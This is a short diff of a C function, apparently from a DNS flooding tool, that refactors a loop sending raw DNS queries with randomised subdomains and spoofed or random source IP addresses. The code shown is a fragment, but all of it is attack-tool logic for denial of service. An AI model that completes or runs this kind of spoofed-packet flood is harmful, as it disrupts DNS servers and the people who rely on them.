@@ -80,7 +80,6 @@ void dns_send()
 	unsigned char *domain = NULL;
 	char *dns_srv = NULL;
 	char *trgt_ip = NULL;
-    char randchar[25];
 	int dns_p = 53; //默认53口
 	int trgt_p = 0;
 	int interval = 0;
@@ -95,10 +94,9 @@ void dns_send()
 	log_debug(logger, "[%s] %s => %s in %d", config.dns_domain, config.dns_sourceip, dns_srv, interval);
 
 	while(1) {
-    random_chars(randchar, 5, 25);
-	domain = str_replace(config.dns_domain, "*", randchar);
+	domain = replace_domain(config.dns_domain, "*");
 
-	trgt_ip = ( strcmp(config.dns_sourceip, "*") == 0 ) ? random_cip() : (char *)config.dns_sourceip;
+	trgt_ip = replace_ip(config.dns_sourceip, "*");
 	trgt_p = random_int(1000, 65535);
 	
 	//printf("trgt_ip=%s,trgt_p=%d,dns_srv=%s,dns_p=%d,domain=%s\n", trgt_ip, trgt_p, dns_srv, dns_p, domain);
@@ -165,7 +163,7 @@ void dns_send()
     else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
     free(domain);
 	free(psgram);
-    //free(data);
+    free(trgt_ip);
     usleep(interval);
     }
 	close(sd);
